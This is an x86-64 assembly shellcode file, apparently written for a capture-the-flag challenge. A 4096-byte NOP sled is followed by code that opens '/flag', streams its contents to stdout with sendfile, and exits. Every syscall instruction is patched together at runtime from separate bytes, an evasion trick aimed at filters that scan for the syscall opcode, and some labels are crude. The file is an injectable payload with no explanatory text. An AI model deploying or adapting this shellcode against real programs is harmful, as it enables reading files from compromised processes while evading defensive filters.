        .intel_syntax noprefix
        .global _start
        .data

_start:
        .space 4096, 0x90
open:
        // open 
//      mov rax,2
        xor rax, rax
        inc rax
        inc rax
        //const char __user * filename
        mov rdx, 0x67616c662faaaaaa
        shr     rdx, 24
        push    rdx
        mov rdi, rsp
        // int flags
        xor rsi, rsi
        // umode_t mode
        xor rdx, rdx
        // 0f 05
        //inc word ptr [cocks]
        movb [rip+cocks], 0x0f
        //syscall
        nop
cocks:  .byte 0x05, 0x05
        push rax

sendfile:
        // size_t count
        mov     r10, 123456789
        // loff_t__user * offset
        xor     rdx, rdx
        // int in_fd
        pop     rsi
        // int out_fd
        xor     rdi, rdi
        inc rdi

        mov     al, 40

        movb [rip+dicks], 0x0f
        nop
dicks: .byte 0x05, 0x05
exit:   //exit
        mov     al, 60
        xor     rdi, rdi


        movb [rip+pricks], 0x0f
        nop
pricks: .byte 0x05, 0x05

